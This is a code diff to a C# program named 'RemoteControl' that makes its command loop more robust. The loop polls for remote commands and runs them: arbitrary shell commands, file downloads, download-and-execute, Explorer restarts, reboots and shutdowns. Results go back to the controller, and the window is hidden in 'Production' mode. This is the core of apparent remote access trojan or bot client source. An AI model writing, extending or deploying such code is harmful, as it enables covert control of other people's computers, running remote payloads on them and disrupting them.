@@ -1,4 +1,4 @@
-using System;
+﻿using System;
 using System.IO;
 using System.Net;
 using System.Text;
@@ -366,47 +366,54 @@ namespace RemoteControl
         {
             while (1 == 1)
             {
-                foreach (KeyValuePair<String, JSONNode> Row in Handler.GetCommands())
+                try
                 {
-                    String Cid = Row.Value["cid"];
-                    String Act = Row.Value["act"];
-                    String Tex = Row.Value["tex"];
-                    String Res = "";
-                    switch (Act)
+                    foreach (KeyValuePair<String, JSONNode> Row in Handler.GetCommands())
                     {
-                        case "RunCMD":
-                            Res = Handler.RunCMD(Tex, true);
-                            break;
-                        case "ShellExecute":
-                            Res = Handler.ShellExecute(Tex, true);
-                            break;
-                        case "Downloader":
-                            Res = Handler.Downloader(Tex, true);
-                            break;
-                        case "Downloader2ShellExecute":
-                            Res = Handler.Downloader2Execute(Tex, true);
-                            break;
-                        case "RebootExplorer":
-                            Res = Handler.RebootExplorer(Tex, true);
-                            break;
-                        case "ShutdownExplorer":
-                            Res = Handler.ShutdownExplorer(Tex, true);
-                            break;
-                        case "StartExplorer":
-                            Res = Handler.StartExplorer(Tex, true);
-                            break;
-                        case "Reboot":
-                            Res = Handler.Reboot(Tex, true);
-                            break;
-                        case "Shutdown":
-                            Res = Handler.Shutdown(Tex, true);
-                            break;
-                        default:
-                            break;
+                        String Cid = Row.Value["cid"];
+                        String Act = Row.Value["act"];
+                        String Tex = Row.Value["tex"];
+                        String Res = "";
+                        switch (Act)
+                        {
+                            case "RunCMD":
+                                Res = Handler.RunCMD(Tex, true);
+                                break;
+                            case "ShellExecute":
+                                Res = Handler.ShellExecute(Tex, true);
+                                break;
+                            case "Downloader":
+                                Res = Handler.Downloader(Tex, true);
+                                break;
+                            case "Downloader2ShellExecute":
+                                Res = Handler.Downloader2Execute(Tex, true);
+                                break;
+                            case "RebootExplorer":
+                                Res = Handler.RebootExplorer(Tex, true);
+                                break;
+                            case "ShutdownExplorer":
+                                Res = Handler.ShutdownExplorer(Tex, true);
+                                break;
+                            case "StartExplorer":
+                                Res = Handler.StartExplorer(Tex, true);
+                                break;
+                            case "Reboot":
+                                Res = Handler.Reboot(Tex, true);
+                                break;
+                            case "Shutdown":
+                                Res = Handler.Shutdown(Tex, true);
+                                break;
+                            default:
+                                break;
+                        }
+                        Handler.FinCommands(Cid, Res);
                     }
-                    Handler.FinCommands(Cid, Res);
+                    Thread.Sleep(10000);
                 }
-                Thread.Sleep(10000);
+                catch (Exception Ex)
+                {
+                    Console.WriteLine(Ex);
+                }
             }
         }
         public static int Main(String[] args)
@@ -415,15 +422,7 @@ namespace RemoteControl
             if (Configs.Enviroments == "Production") HideWindow(Configs.WIN_TITLE);
 
             Configs.Init();
-            try
-            {
-                RunApplication();
-            }
-            catch (Exception Ex)
-            {
-                Console.WriteLine(Ex);
-                Console.ReadLine();
-            }
+            RunApplication();
             return 0;
         }
     }
